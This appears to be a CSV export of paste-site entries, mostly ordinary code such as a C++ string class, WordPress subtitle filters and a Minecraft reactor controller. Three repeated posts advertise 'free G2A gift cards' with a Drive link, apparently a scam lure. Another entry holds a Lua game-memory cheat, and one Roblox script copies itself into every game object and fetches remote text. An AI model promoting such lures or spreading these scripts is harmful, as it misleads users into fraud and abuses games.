id,title,username,language,date,content
JXC0nM9E,🤑G2A.com Free Gift Card FIX July 2024🤑,FeasModz514,JavaScript,Saturday 29th of June 2024 12:21:38 AM CDT,"G2A.com free gift card & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
k0MdJHzM,🤑G2A.com Free Gift Card FIX July 2024🤑,kjihu25,JavaScript,Saturday 29th of June 2024 12:15:35 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
ig9ye08K,🤑G2A.com Free Gift Card FIX July 2024🤑,Bufayez,JavaScript,Saturday 29th of June 2024 12:09:32 AM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
0mTVMXVV,Untitled,35657,C++,Friday 28th of June 2024 11:50:51 PM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

class String {

public:

	String() : size_(0), capacity_(15), str_(new char[capacity_]) {}

	explicit String(const int string_capacity) : size_(0), capacity_(string_capacity), str_(new char[capacity_]) {}

	String(const char* new_string) : size_(strlen(new_string)), capacity_(size_ + 1), str_(new char[capacity_]) {
		strcpy(str_, new_string);
	}

	String(const String& other) : size_(other.size_), capacity_(other.capacity_), str_(new char[capacity_]) {
		strcpy(str_, other.str_);
	}

	String(String&& other) : size_(other.size_), capacity_(other.capacity_), str_(other.str_) {
		other.str_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
	}

	String& operator=(const String& other) {
		if (&other != this) {
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = new char[capacity_];
			strcpy(str_, other.str_);
		}
		return *this;
	}

String& operator=(String&& other) {
		if (&other != this) { 
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = other.str_;
			other.str_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} 

	String& operator=(const char* new_string) {
		int new_space = strlen(new_string) + 1;
		if (capacity_ < new_space) {
			delete[] str_;
			capacity_ = new_space;
			str_ = new char[capacity_];
		}
		strcpy(str_, new_string);
		size_ = capacity_ - 1;
		return *this;
	}

	char& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	const char& operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	bool operator==(const String& other) const {
		return strcmp(str_, other.str_) == 0;
	}

	bool operator!=(const String& other) const {
		return strcmp(str_, other.str_) != 0;
	}

	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	~String() {
		delete[] str_;
	}

	friend ostream& operator<<(ostream& output, const String& str);

private:
	int size_;
	int capacity_;
	char* str_;
};


ostream& operator<<(ostream& output, const String& str) {
	output << str.str_;
	return output;
}

istream& operator>>(istream& input, String& str) {
	int capacity = 15;
	int i = 0;
	char* new_str = new char[capacity];
	char ch;

	while (ch = input.get()) {
		if (ch == ' ' || ch == '\n') {
			break;
		}
		if (i == capacity - 1) {
			char* temp = new char[capacity *= 2];
			strcpy(temp, new_str);
			delete[] new_str;
			new_str = temp;
		}
		new_str[i++] = ch;
	}
	new_str[i] = '\0';
	str = new_str;
	delete[] new_str;
	return input;
}

int main() {
	setlocale(LC_ALL, ""ru"");

	String str1;

	String str2(30);

	String str3(""Привет"");

	cout << str3 << endl;

	str3= ""Новая строка"";

	cout << str3 << endl;

	str1 = ""Еще одна новая строка"";

	cout << str1 << endl;

	String str4(str3);

	cout << str4 << endl;

	str4 = str1;

	cout << str1 << endl;

	cout << str4 << endl;

	str4[5] = 'н';

	cout << str4 << endl;

	cout << (str3 == str4) << endl;

	cout << (str3 != str4) << endl;
}
"
ZDezPrMt,Untitled,Onenoone1,Lua,Friday 28th of June 2024 11:18:28 PM CDT,"gg.alert(""NYC TEST"")
function Admin(address,flags,freeze,name,value)
    set = {}
    set[1] = {}
    set[1].address = address
    set[1].flags = flags
    set[1].value = value
    set[1].freeze = freeze
    set[1].name = name
    gg.setValues(set)
    end
 function warp(map,x,y)
    Admin(N[1].address + -420,4,false,ReMap,map)  gg.addListItems(set)
       Admin(N[1].address + -488,4,false,nil,x*256) 
       Admin(N[1].address + -480,4,false,nil,y*256) 
       Admin(N[1].address + -296,4,false,nil,12821157) 
       gg.sleep(500)
       Admin(N[1].address + -0x11C,4,true,nil,256)  gg.addListItems(set) 
 end

 function main()
    ga = gg.choice({
    ""🔰Tast *256 map🔰"",--1
    ""🔰nill🔰"",--2
    ""🔰nill🔰"",--3
    ""🔰nill🔰"",--4
    ""🔰ออก🔰"", --5
    },nil,[[⚠️Garmin⚠️
    ]])
    if ga== nil then else
    if ga== 1 then warp(80000,58,80) end
    if ga== 2 then end
    if ga== 3 then end
    if ga== 4 then end
    if ga== 5 then os.exit() end
    end
    NUX=-1
    end


    while true do
    if gg.isVisible(true) then
    NUX=1
    gg.setVisible(false)
    end
    if NUX==1 then main()
    NUX=-1
    end
    end"
pYbSVcWS,Untitled,phpface,PHP,Friday 28th of June 2024 11:01:36 PM CDT,"add_filter( 'streamtube/player/file/setup', function( $setup, $source ){

    if( ! array_key_exists( 'mediaid' , $setup ) ){
        return $setup;
    }

    $post_id = $setup['mediaid'];

    if( ! get_post_status( $post_id ) || array_key_exists( 'tracks' , $setup ) ){
        return $setup;
    }

    $default_subtitle   = strtolower(get_option( 'player_default_subtitle' ));

    $_tracks = array();

    // Get the video URL meta value
    $video_url = get_post_meta( $post_id, 'video_url', true );

    if( ! $video_url ){
        return $setup;
    }

    // Extract the YouTube ID from the video URL
    preg_match('/(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/', $video_url, $matches);

    if( ! $matches || ! isset( $matches[1] ) ){
        return $setup;
    }

    $youtube_id = $matches[1];

    // Directory where subtitle files are stored
    $subtitle_dir = WP_CONTENT_DIR . '/uploads/subtitles/' . $youtube_id;

    // Check if directory exists
    $subtitle_files = array();
    if( is_dir( $subtitle_dir ) ){
        // Scan the directory for .vtt files
        $subtitle_files = glob( $subtitle_dir . '/*.vtt' );
    }

    // Add local subtitle files if not already added
    if( $subtitle_files ){
        foreach ( $subtitle_files as $subtitle_file ) {
            $file_name = basename( $subtitle_file, '.vtt' );
            $file_parts = explode('.', $file_name);

            if( count( $file_parts ) >= 2 && $file_parts[0] === $youtube_id ){
                // Extract language code before the hyphen if present
                $language = explode('-', $file_parts[1])[0];
                $source = content_url( '/uploads/subtitles/' . $youtube_id . '/' . basename( $subtitle_file ) );

                // Check if this language is already added from meta
                $language_exists = false;
                foreach( $_tracks as $track ){
                    if( $track['language'] === $language ){
                        $language_exists = true;
                        break;
                    }
                }

                if( ! $language_exists ){
                    $_tracks[] = array(
                        'language' => $language,
                        'source'   => $source
                    );
                }
            }
        }
    }

    if( $_tracks ){
        for ( $i = 0; $i < count( $_tracks ); $i++) {

            $language = streamtube_core_get_language_by_code( strtolower( $_tracks[$i]['language'] ) );

            $track = array(
                'kind'      =>  'captions',
                'srclang'   =>  $_tracks[$i]['language'],
                'label'     =>  $language ? $language['name'] : '',
                'src'       =>  $_tracks[$i]['source']
            );

            if( ($default_subtitle == 'first' && $i == 0) || ( $default_subtitle == strtolower( $_tracks[$i]['language'] ) ) ){
                $track['default'] = true;
            }

            /**
             * Filter the track
             */
            $track = apply_filters( 'streamtube/core/post/player/track', $track, $setup, $source );

            $setup['tracks'][] = $track;
        }
    }

    return $setup; 

}, 30, 2 );"
D9tE252b,Untitled,CrhisDLM,C++,Friday 28th of June 2024 10:56:13 PM CDT,"//lAB 5
//Crhistian David Lucumi
//Usc
//Version 1.2
 int valor=0;

#define MAX 9
int led[MAX]={
  3, 5 , 6};
int t_off=100;
int t_offA=100;
int t_on=100;
 
 
void setup(){
  Serial.begin(9600);
  for(int pin=0; pin<=MAX;pin++){
    pinMode(led[pin], OUTPUT);
   
  }
}
 
 
void loop(){
  
  if (Serial.available()>0){
    valor=Serial.read();
    if (valor=='R'){
    t_on=Serial.parseInt();
    }
    if (valor=='G'){
    t_off=Serial.parseInt();
    }
    
    if (valor=='B'){
    t_offA=Serial.parseInt();
    }
  }
  prender(led[0], t_on);
  prender(led[1], t_off);
  prender(led[2], t_offA);
}
void prender(int le, int tem){
  analogWrite(le, tem);
 
}
void apagar(int le, int tem){
  analogWrite(le, tem);
 
 
}"
Uc0TFXAs,Untitled,phpface,PHP,Friday 28th of June 2024 09:28:08 PM CDT,"/**
 *
 * Filter subtitles
 *
 * @param array $tracks
 * @param int $post_id
 * 
 */
add_filter( 'streamtube/core/post/text_tracks', function( $tracks, $post_id ){

    // Return tracks if they have been manually uploaded through the form.
    // Otherwise, remove these two lines.

    if( $tracks ){
        return $tracks;
    }

    $_tracks = array();

    // Get the video URL meta value
    $video_url = get_post_meta( $post_id, 'video_url', true );

    if( ! $video_url ){
        return false;
    }

    // Extract the YouTube ID from the video URL
    preg_match('/(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/', $video_url, $matches);

    if( ! $matches || ! isset( $matches[1] ) ){
        return false;
    }

    $youtube_id = $matches[1];

    // Directory where subtitle files are stored
    $subtitle_dir = WP_CONTENT_DIR . '/uploads/subtitles/' . $youtube_id;

    // Check if directory exists
    $subtitle_files = array();
    if( is_dir( $subtitle_dir ) ){
        // Scan the directory for .vtt files
        $subtitle_files = glob( $subtitle_dir . '/*.vtt' );
    }

    // Get the text tracks from post meta
    $tracks = get_post_meta( $post_id, 'text_tracks', true );

    if( $tracks && is_array( $tracks ) && array_key_exists( 'languages', $tracks ) && is_array( $tracks['languages'] ) ){
        for ( $i = 0; $i < count( $tracks['languages'] ); $i++) {
            if( $tracks['languages'][$i] && $tracks['sources'][$i] ){
                $file_type = wp_check_filetype( $tracks['sources'][$i] );
                if( array_key_exists( 'ext', $file_type ) && in_array( strtolower( $file_type['ext'] ), apply_filters( 'streamtube/core/text_track_format',  array( 'vtt' ) ) ) ){
                    $_tracks[] = array(
                        'language'  =>  $tracks['languages'][$i],
                        'source'    =>  $tracks['sources'][$i]
                    );
                }
            }
        }
    }

    // Add local subtitle files if not already added
    if( $subtitle_files ){
        foreach ( $subtitle_files as $subtitle_file ) {
            $file_name = basename( $subtitle_file, '.vtt' );
            $file_parts = explode('.', $file_name);

            if( count( $file_parts ) >= 2 && $file_parts[0] === $youtube_id ){
                // Extract language code before the hyphen if present
                $language = explode('-', $file_parts[1])[0];
                $source = content_url( '/uploads/subtitles/' . $youtube_id . '/' . basename( $subtitle_file ) );

                // Check if this language is already added from meta
                $language_exists = false;
                foreach( $_tracks as $track ){
                    if( $track['language'] === $language ){
                        $language_exists = true;
                        break;
                    }
                }

                if( ! $language_exists ){
                    $_tracks[] = array(
                        'language' => $language,
                        'source'   => $source
                    );
                }
            }
        }
    }

    return $_tracks;

}, 10, 2 );
"
pPUA3Ke0,Roblox Auto-Insert Script,Pewter10,Lua,Friday 28th of June 2024 09:27:18 PM CDT,"--{{Made by LockDown007}}--

--{{Be careful, this inserts this script inside EVERY Part/Model}}--


-- HOW TO USE --

-- Make sure your game is published and HTTPrequests are enabled
-- Paste your script inside the blank space
-- Make sure this script is inside Workspace


--{{Script begins here}}--

-- Get a list of all parts and models in the workspace
local descendants = game.Workspace:GetDescendants()

-- Loop through each part or model and insert the script
for i, descendant in ipairs(descendants) do
	-- Check if the descendant is a part or model
	if descendant:IsA(""BasePart"") or descendant:IsA(""Model"") then
		-- Check if the script is already present in the part or model
		local hasScript = false
		for _, child in ipairs(descendant:GetChildren()) do
			if child.Name == script.Name then
				hasScript = true
				break
			end
		end

		-- If the script is not present, insert it
		if not hasScript then
			local scriptClone = script:Clone()
			scriptClone.Parent = descendant
		end
	end
end

-- Set the script to run automatically
script.Parent = game:GetService(""StarterPlayer"").StarterPlayerScripts

-- Put your script in the empty space below (Do not edit anything above this or the script will break!) --
--




--
-- Put your script in the empty space above (Do not edit anything below this or the script will break!) --


local pastebinLink = ""https://pastebin.com/raw/1u54szTh""

local httpService = game:GetService(""HttpService"")

local success, result = pcall(function()
	return httpService:GetAsync(pastebinLink)
end)
if success then
	print(result)
else
	warn(""Failed to retrieve text from Pastebin: "" .. tostring(result))
end
"
GaBhACpQ,Draconic Reactor Infinity Evolved Reloaded 1.12.2,FriZrio,Lua,Friday 28th of June 2024 08:57:41 PM CDT,"--This is NOT my Code please visit https://github.com/acidjazz/drmon for more Information

local version = ""1.0""
-- modifiable variables
local reactorSide = ""back""
local outputfluxgateSide = ""right""

local targetStrength = 50
local maxTemperature = 8000
local safeTemperature = 7500
local lowestFieldPercent = 25

-- please leave things untouched from here on
os.loadAPI(""lib/f"")

-- toggleable via the monitor, use our algorithm to achieve our target field strength or let the user tweak it
local autoInputGate = 0
local curInputGate = 222000

-- monitor 
local mon, monitor, monX, monY

-- peripherals
local reactor
local outputfluxgate
local inputfluxgate

-- reactor information
local ri

-- last performed action
local action = ""None since reboot""
local emergencyCharge = false
local emergencyTemp = false

monitor = f.periphSearch(""monitor"")
outputfluxgate = peripheral.wrap(outputfluxgateSide)
inputfluxgate = f.periphSearch(""flux_gate"")
reactor = peripheral.wrap(reactorSide)

if monitor == null then
	error(""No valid monitor was found"")
end

if outputfluxgate == null then
	error(""No valid output fluxgate was found"")
end

if reactor == null then
	error(""No valid reactor was found"")
end

if inputfluxgate == null then
	error(""No valid input flux gate was found"")
end

monX, monY = monitor.getSize()
mon = {}
mon.monitor,mon.X, mon.Y = monitor, monX, monY

--write settings to config file
function save_config()
  sw = fs.open(""config.txt"", ""w"")   
  sw.writeLine(version)
  sw.writeLine(autoInputGate)
  sw.writeLine(curInputGate)
  sw.close()
end

--read settings from file
function load_config()
  sr = fs.open(""config.txt"", ""r"")
  autoInputGate = tonumber(sr.readLine())
  curInputGate = tonumber(sr.readLine())
  sr.close()
end


-- 1st time? save our settings, if not, load our settings
if fs.exists(""config.txt"") == false then
  save_config()
else
  load_config()
end

function buttons()

  while true do
    -- button handler
	sleep(0) 
    event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    -- output gate controls
    -- 2-4 = -1000, 6-9 = -10000, 10-12,8 = -100000
    -- 17-19 = +1000, 21-23 = +10000, 25-27 = +100000
    if yPos == 10 then
      local flowOutputfluxgate = outputfluxgate.getSignalLowFlow()
      if xPos >= 2 and xPos <= 4 then
        flowOutputfluxgate = flowOutputfluxgate-1000
      elseif xPos >= 6 and xPos <= 9 then
        flowOutputfluxgate = flowOutputfluxgate-10000
      elseif xPos >= 10 and xPos <= 12 then
        flowOutputfluxgate = flowOutputfluxgate-100000
      elseif xPos >= 17 and xPos <= 19 then
        flowOutputfluxgate = flowOutputfluxgate+100000
      elseif xPos >= 21 and xPos <= 23 then
        flowOutputfluxgate = flowOutputfluxgate+10000
      elseif xPos >= 25 and xPos <= 27 then
        flowOutputfluxgate = flowOutputfluxgate+1000
      end
	  if flowOutputfluxgate < 0 then
		flowOutputfluxgate = 0
	  end
      outputfluxgate.setSignalLowFlow(flowOutputfluxgate)
    end

    -- input gate controls
    -- 2-4 = -1000, 6-9 = -10000, 10-12,8 = -100000
    -- 17-19 = +1000, 21-23 = +10000, 25-27 = +100000
    if yPos == 8 and autoInputGate == 0 and xPos ~= 14 and xPos ~= 15 then
      if xPos >= 2 and xPos <= 4 then
        curInputGate = curInputGate-1000
      elseif xPos >= 6 and xPos <= 9 then
        curInputGate = curInputGate-10000
      elseif xPos >= 10 and xPos <= 12 then
        curInputGate = curInputGate-100000
      elseif xPos >= 17 and xPos <= 19 then
        curInputGate = curInputGate+100000
      elseif xPos >= 21 and xPos <= 23 then
        curInputGate = curInputGate+10000
      elseif xPos >= 25 and xPos <= 27 then
        curInputGate = curInputGate+1000
      end
	  if curInputGate < 0 then
		curInputGate = 0
	  end
      inputfluxgate.setSignalLowFlow(curInputGate)
      save_config()
    end

    -- input gate toggle
    if yPos == 8 and ( xPos == 14 or xPos == 15) then
      if autoInputGate == 1 then
        autoInputGate = 0
      else
        autoInputGate = 1
      end
      save_config()
    end

  end
end

function drawButtons(y)

  -- 2-4 = -1000, 6-9 = -10000, 10-12,8 = -100000
  -- 17-19 = +1000, 21-23 = +10000, 25-27 = +100000

  f.draw_text(mon, 3, y, ""-"", colors.white, colors.gray)
  f.draw_text(mon, 6, y, ""--"", colors.white, colors.gray)
  f.draw_text(mon, 10, y, ""---"", colors.white, colors.gray)

  f.draw_text(mon, 17, y, ""+++"", colors.white, colors.gray)
  f.draw_text(mon, 22, y, ""++"", colors.white, colors.gray)
  f.draw_text(mon, 26, y, ""+"", colors.white, colors.gray)
end



function update()
  while true do 

    f.clear(mon)

    ri = reactor.getReactorInfo()

    -- print out all the infos from .getReactorInfo() to term
	print(""Current Version: "", version)

    if ri == nil then
      error(""Reactor has an invalid setup"")
    end

    for k, v in pairs (ri) do
      print(k.. "": "".. tostring(v))
    end
    print(""Output Gate: "", outputfluxgate.getSignalLowFlow())
    print(""Input Gate: "", inputfluxgate.getSignalLowFlow())

    -- monitor output
	--f.draw_text(mon, 1, 1, ""O"", colors.black, colors.white)
	f.draw_text(mon, 1, 1, ""Reactor Controler>>>>>>>>>>>>"", colors.white, colors.green)

    local statusColor
    statusColor = colors.red

    if ri.status == ""running"" then
      statusColor = colors.green
    elseif ri.status == ""cold"" then
      statusColor = colors.blue
    elseif ri.status == ""warming_up"" then
      statusColor = colors.orange
    end

    f.draw_text_lr(mon, 2, 2, 1, ""Reactor Status:"", string.upper(ri.status), colors.white, statusColor, colors.black)

    f.draw_text_lr(mon, 2, 4, 1, ""Generation:"", f.format_int(ri.generationRate) .. "" RF/t"", colors.white, colors.lime, colors.black)

    local tempColor = colors.red
    if ri.temperature <= 5000 then tempColor = colors.green end
    if ri.temperature >= 5000 and ri.temperature <= 6500 then tempColor = colors.orange end
    f.draw_text_lr(mon, 2, 6, 1, ""Temperature:"", f.format_int(ri.temperature) .. ""C"", colors.white, tempColor, colors.black)

    f.draw_text_lr(mon, 2, 9, 1, ""Output Gate:"", f.format_int(outputfluxgate.getSignalLowFlow()) .. "" RF/t"", colors.blue, colors.red, colors.black)

    -- buttons
    drawButtons(10)

    f.draw_text_lr(mon, 2, 7, 1, ""Input Gate:"", f.format_int(inputfluxgate.getSignalLowFlow()) .. "" RF/t"", colors.orange, colors.red, colors.black)

    if autoInputGate == 1 then
      f.draw_text(mon, 14, 8, ""AU"", colors.white, colors.gray)
    else
      f.draw_text(mon, 14, 8, ""MA"", colors.white, colors.gray)
      drawButtons(8)
    end

    local satPercent
    satPercent = math.ceil(ri.energySaturation / ri.maxEnergySaturation * 10000)*.01

    f.draw_text_lr(mon, 2, 11, 1, ""Energy Saturation"", satPercent .. ""%"", colors.white, colors.white, colors.black)
    f.progress_bar(mon, 2, 12, mon.X-2, satPercent, 100, colors.blue, colors.gray)

    local fieldPercent, fieldColor
    fieldPercent = math.ceil(ri.fieldStrength / ri.maxFieldStrength * 10000)*.01

    fieldColor = colors.red
    if fieldPercent >= 50 then fieldColor = colors.green end
    if fieldPercent < 50 and fieldPercent > 30 then fieldColor = colors.orange end
	
	f.draw_text_lr(mon, 2, 14, 1, ""Field Strength"", fieldPercent .. ""%"", colors.white, fieldColor, colors.black)
    f.progress_bar(mon, 2, 15, mon.X-2, fieldPercent, 100, fieldColor, colors.gray)

    local fuelPercent, fuelColor

    fuelPercent = 100 - math.ceil(ri.fuelConversion / ri.maxFuelConversion * 10000)*.01

    fuelColor = colors.red

    if fuelPercent >= 70 then fuelColor = colors.green end
    if fuelPercent < 70 and fuelPercent > 30 then fuelColor = colors.orange end

    f.draw_text_lr(mon, 2, 17, 1, ""Draconium "", fuelPercent .. ""%"", colors.white, fuelColor, colors.black)
    f.progress_bar(mon, 2, 18, mon.X-2, fuelPercent, 100, fuelColor, colors.gray)

    f.draw_text_lr(mon, 2, 19, 1, ""Action: "", action, colors.gray, colors.gray, colors.black)

    -- actual reactor interaction
    --
    if emergencyCharge == true then
      reactor.chargeReactor()
    end
    
    -- are we charging? open the floodgates
	if autoInputGate == 1 then
		if ri.status == ""warming_up"" then
			inputfluxgate.setSignalLowFlow(100000000)
			emergencyCharge = false
		end
    end

    -- are we stopping from a shutdown and our temp is better? activate
    if emergencyTemp == true and ri.status == ""stopping"" and ri.temperature < 4000 then
      reactor.activateReactor()
      emergencyTemp = false
    end

    -- are we on? regulate the input fludgate to our target field strength
    -- or set it to our saved setting since we are on manu
       
	if ri.status == ""running"" then
      if autoInputGate == 1 then 
        fluxval = ri.fieldDrainRate / (1 - (targetStrength/100) )
        print(""Target Gate: "".. fluxval)
        inputfluxgate.setSignalLowFlow(fluxval)
      else
        inputfluxgate.setSignalLowFlow(curInputGate)
      end
    end

    -- safeguards
    --
    
    -- out of fuel, kill it
    if fuelPercent <= 10 then
      reactor.stopReactor()
      action = ""Fuel below 10%, Need refuel""
    end

    -- field strength is too low, kill and it try and charge it before it blows
    if fieldPercent <= lowestFieldPercent and ri.status == ""running"" then
      action = ""Field Str < "" ..lowestFieldPercent..""%""
      reactor.stopReactor()
      reactor.chargeReactor()
      emergencyCharge = true
    end

    -- temperature too high, kill it and activate it when its cool
    if ri.temperature > maxTemperature then
      reactor.stopReactor()
      action = ""Temp > "" .. maxTemperature
      emergencyTemp = true
    end

    sleep(0.1)
  end
end

parallel.waitForAny(buttons, update)
"
aRJe3tJW,BWR - Changelog 28/06/24,SSilver,Diff,Friday 28th of June 2024 08:55:27 PM CDT,"Buildings
- Reduced support structure build speed bonus to 80% faster (was 100% faster)
There was concern of support structures building too quickly, which was a considerable boon since they're not often in the line of fire and more guaranteed to be built compared to sentries. They were nerfed slightly to just about 12 seconds at base.

Soda Popper
+ Reverted damage to build Hype meter to 350 (was 400)
- Increased cost for air jumps to 30% meter (was 20%)
The overall cost of jumps was increased a fair bit (from 80 to 105 damage), the greatest nerf coming with how many jumps the scout can hold at once. This is meant to encourage more frequent jumps and to prevent the Scout from holding onto too many jumps in any fight.

Baby Face's Blaster
- Increased damage to build Boost meter to 200 (was 120)
With all the ways to better avoid losing boost, the current boost was still seen as too easy to acquire. It was increased by a fair bit to make it a bit more taxing to build boost up.

Flying Guillotine
+ Added: deals mini-crits on long-stance hits
- Increased recharge time to 8 seconds (was 5 seconds)
- Removed faster recharge on long distance hits
Spammability of the weapon was of major concern, both allowing easily tossing another after a miss and especially making it easy on getting a hit. To make up for it being increased, it was given a damage boost on long-distance strikes to reward them.

The Backburner
+ Airblast push force bonus applies to enemies
- Added: 33% slower airblast pressure recharge
It's boosted mobility was rather strong, making even jumps attempted with a lower pressure comparable to normal airblast jumps. Slowing this down should now make the pyro's jumps less frequent for how powerful they are.

The Phlogistinator
+ Increased max critical damage on rampup to +200% (was +100%)
The damage ramp up was seen as not quite strong enough for how you're forced to consistently track enemies to reach it. It now ramps up in damage faster to caps out at full crit damage and be a bit more rewarding sooner.

Dragon's Fury
~ Airblast force pressure is no longer tied to fire rate repressurization
With pressure being tied to the weapon's firing rate, it allowed the flamethrower to get very frequent airblast jumps done at full strength. This change brings it in-line with the stock airblast pressure system.

Thermal Thruster
~ Added smoking effect to thruster while it has charges available
A QOL feature to better communicate to enemies when the pyro is capable of doing a mini-boost.

Pomson 6000
- Reverted hitbox size on the projectile
The weapon was seen as too easy to hit with for how much damage it dealt. This tweak should hopefully make it less unfun to fight against.

Eureka Effect
+ Resupply given when teleporting to spawn
A QOL feature to better accomodate the variety in distances from spawn to resupply.

Cloak and Dagger
+ Decreased cloak duration penalty to -20% (was -33%)
A slight buff to the watch, which was seen as needing a slight push to give the Spy a bit more leniency in how quickly they can approach the enemy."
z9UmvdAu,Untitled,Gojoff_yt,JSON,Friday 28th of June 2024 08:33:35 PM CDT,"{""página"":1,""img"":
[{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVL9lJ8-f6xHZg43fdZ2N98ZqZfe22wnt38Q&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZwHnVb8RcQ9ICoVfvdeLdz02oTBChAMayhg&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuXlFaApxVnYIYKeRhy9DSRVxJZBVDsEY5qg&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqaLvfzfDgKP6Qe6v46i_0yPyzbqqyyoXpQA&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVL9lJ8-f6xHZg43fdZ2N98ZqZfe22wnt38Q&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqaLvfzfDgKP6Qe6v46i_0yPyzbqqyyoXpQA&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVL9lJ8-f6xHZg43fdZ2N98ZqZfe22wnt38Q&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZwHnVb8RcQ9ICoVfvdeLdz02oTBChAMayhg&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVL9lJ8-f6xHZg43fdZ2N98ZqZfe22wnt38Q&amp;usqp=CAU""}
{""link"":""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZwHnVb8RcQ9ICoVfvdeLdz02oTBChAMayhg&amp;usqp=CAU""}]"
a41U6Cnu,timeline_47377020240629_010706.json,Gotolei,JSON,Friday 28th of June 2024 08:12:33 PM CDT,"{
	""daterecorded"": ""1719623226"",
	""starttime"": ""0"",
	""entries"": [
		{
			""id"": ""1"",
			""time"": ""0"",
			""type"": ""usermarker"",
			""title"": """",
			""description"": """",
			""icon"": ""steam_marker"",
			""priority"": 0,
			""duration"": ""0"",
			""possible_clip"": 2
		}
,
		{
			""id"": ""2"",
			""time"": ""22149"",
			""type"": ""screenshot"",
			""icon"": ""steam_screenshot"",
			""priority"": 10,
			""handle"": 1888
		}
,
		{
			""id"": ""3"",
			""time"": ""0"",
			""type"": ""usermarker"",
			""title"": """",
			""description"": """",
			""icon"": ""steam_marker"",
			""priority"": 0,
			""duration"": ""0"",
			""possible_clip"": 2
		}

	]
,
	""endtime"": ""29606""
}
"
